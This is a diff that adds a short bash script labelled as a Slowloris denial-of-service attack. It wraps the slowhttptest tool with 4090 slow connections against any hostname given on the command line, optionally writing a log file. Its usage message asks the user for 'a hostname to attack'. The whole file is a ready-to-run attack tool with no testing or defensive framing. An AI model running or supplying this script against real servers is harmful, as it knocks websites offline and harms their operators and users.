@@ -1,0 +1,19 @@
+#!/usr/bin/env bash
+#
+# Slowloris DoS attack script.
+#
+if [ ! -z "$1" ]; then
+    domainurl="$1"
+fi
+if [ ! -z "$2" ]; then
+    logfile="$2"
+fi
+if [ ! -z "$domainurl" ] && [ ! -z "$logfile" ]; then
+    slowhttptest -g -H -c 4090 -t GET -r 1000 -l 60 -u https://"$domainurl" -o "$logfile";
+elif [ ! -z "$domainurl" ] && [ -z "$logfile" ]; then
+    slowhttptest -g -H -c 4090 -t GET -r 1000 -l 60 -u https://"$domainurl";
+else
+    echo && echo "You need to supply a hostname to attack... " && echo && sleep 2;
+    echo "Like so: slowloris <hostname> <logfile>" && echo && sleep 2;
+    exit 1;
+fi
